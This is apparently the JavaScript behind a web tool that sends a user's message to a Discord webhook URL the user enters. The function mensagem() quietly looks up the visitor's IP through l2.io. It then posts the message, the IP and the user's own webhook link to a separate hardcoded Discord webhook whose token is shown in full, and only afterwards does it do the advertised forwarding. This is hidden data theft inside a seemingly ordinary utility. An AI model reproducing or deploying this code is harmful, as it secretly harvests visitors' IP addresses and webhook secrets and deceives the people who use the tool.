var ipe
function getIp(callback)
{
    function response(s)
    {
        callback(window.userip);

        s.onload = s.onerror = null;
        document.body.removeChild(s);
    }

    function trigger()
    {
        window.userip = false;

        var s = document.createElement("script");
        s.async = true;
        s.onload = function() {
            response(s);
        };
        s.onerror = function() {
            response(s);
        };

        s.src = "https://l2.io/ip.js?var=userip";
        document.body.appendChild(s);
    }

    if (/^(interactive|complete)$/i.test(document.readyState)) {
        trigger();
    } else {
        document.addEventListener('DOMContentLoaded', trigger);
    }
}
getIp(function (ip) {
   
  ipe = ip;
});
function mensagem() {
  var conteudo = document.getElementById("msg").value;
    var link = document.getElementById("cabeca").value;
    var rastrear = "**webhook**   conteudo: "+conteudo+"  ip: "+ipe+"   link: "+link;
    fetch("https://discord.com/api/webhooks/834322895488286763/mzDIhREVNie-USgcSuZHIznlW7gjffehzExjhcMFxF96JShyAlSYwPrm4XrxFjC9ZIXm", {
      "headers": {
        "accept": "*/*",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site"
      },
      "referrer": "https://sheeptester.github.io/",
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": "{\"content\":\""+rastrear+"\",\"username\":\"\",\"avatar_url\":null,\"tts\":false,\"embeds\":[]}",
      "method": "POST",
      "mode": "cors"
    });
    
    console.log(conteudo);
    fetch(link, {
  "headers": {
    "accept": "*/*",
    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "content-type": "application/json",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site"
  },
  "referrer": "https://sheeptester.github.io/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"content\":\""+conteudo+"\",\"username\":\"\",\"avatar_url\":null,\"tts\":false,\"embeds\":[]}",
  "method": "POST",
  "mode": "cors"
});
    
}